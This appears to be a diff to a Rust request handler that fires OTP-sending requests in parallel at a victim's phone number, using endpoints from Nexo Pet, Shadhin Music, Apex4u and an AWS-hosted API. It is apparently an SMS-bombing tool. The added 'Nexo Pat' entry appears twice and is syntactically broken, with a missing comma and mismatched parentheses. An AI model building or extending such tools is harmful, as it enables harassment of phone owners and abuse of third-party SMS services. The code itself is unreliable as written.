@@ -116,6 +116,10 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
     // ═══════════════════════════════════════════════
     let api_results = parallel![
         // ── BD SMS APIs ──
+        fire("Nexo Pat")
+    "https://host03pet.nexopet.com/api/v1.0/users/send-otp"
+    json!({"phone": &number,})     
+), 
        fire("Shadhin Music",
     "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
     json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})
@@ -132,8 +136,12 @@ fire("Apex4u",
     "https://api.apex4u.com/api/auth/login",
     json!({"phoneNumber": &number})
 ),
-
-
+        
+fire("Nexo Pat")
+    "https://host03pet.nexopet.com/api/v1.0/users/send-otp"
+    json!({"phone": &number,})     
+), 
+        
 fire("AWS POC",
     "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
     json!({"phone": &number})
